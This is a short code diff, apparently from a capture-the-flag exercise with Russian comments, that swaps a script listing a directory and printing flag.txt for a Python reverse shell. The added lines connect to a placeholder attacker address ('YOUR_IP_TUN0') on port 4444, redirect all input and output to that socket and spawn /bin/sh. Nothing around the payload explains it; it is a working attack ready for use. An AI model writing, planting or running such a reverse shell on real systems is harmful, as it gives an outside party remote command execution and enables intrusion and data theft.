@@ -1,11 +1,7 @@
-import os
-
-# Попытка 1: Просто вывести список файлов (если это CGI)
-print("Content-Type: text/plain\n") 
-try:
-    print("--- DIRECTORY LISTING ---")
-    print(os.popen("ls -la").read())
-    print("--- FLAG ---")
-    print(os.popen("cat flag.txt").read())
-except Exception as e:
-    print(str(e))
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("ТВОЙ_IP_TUN0",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/sh")
